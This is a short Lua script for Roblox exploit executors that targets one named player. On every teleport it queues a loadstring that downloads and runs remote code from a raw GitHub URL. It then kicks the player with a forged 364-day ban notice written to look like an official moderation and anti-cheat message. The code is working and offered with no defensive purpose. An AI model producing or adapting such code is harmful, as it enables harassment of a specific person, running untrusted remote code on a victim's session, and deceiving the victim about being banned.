local targetName = "t1fails"
local rawUrl = "https://raw.githubusercontent.com/radmin1337/serverhop/refs/heads/main/kicker"
local kickMessage = "You were banned by this experience or its moderators for 364 days, 23 hours, 59 minutes.\n\nModeration message:\n\nBAC Alpha-3B | If you believe this is a mistake, please\nmake a ticket in our support server!"

local player = game:GetService("Players").LocalPlayer

if player.Name == targetName then
    local qot = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
    if qot then
        qot('loadstring(game:HttpGet("' .. rawUrl .. '"))()')
    end
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(0.5)
    player:Kick(kickMessage)
end
